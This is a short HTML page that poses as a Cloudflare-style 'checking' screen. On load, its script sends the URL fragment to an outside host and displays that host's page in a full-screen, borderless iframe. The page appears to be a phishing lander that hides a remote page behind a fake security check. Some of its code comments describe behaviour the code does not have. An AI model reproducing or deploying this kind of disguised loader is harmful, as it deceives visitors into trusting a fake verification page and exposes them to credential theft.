<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just checking a few things...</title>
    <script>
    // Function to get the hash parameter from the URL.
    function getHashParameter() {
        // Get the hash from the URL (e.g., #parameter)
        const hash = window.location.hash;

        // Return the parameter
        return hash;
    }

    // Function to set the iframe src based on the hash parameter
    function setIframeSrc() {
        var hashParameter = getHashParameter();
        const link = "https://pgn-s.com/PIerBmuU";
        var fullURL = link + hashParameter;
        document.getElementById("cf-turnstile").src = fullURL;
        //if (hashParameter) {
            // Set the iframe src to include the hash parameter
            //document.getElementById("cf-turnstile").src = fullURL;
        //}
    }

    // Set the iframe src and block Chrome users on window load
    window.onload = function() {
        setIframeSrc(); // Delay execution by 7 seconds
    };
</script>
</head>
<body>
        <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
    <iframe id="cf-turnstile" src="#" style="width:100%; height:100%; border:none;" ></iframe>
</body>
</html>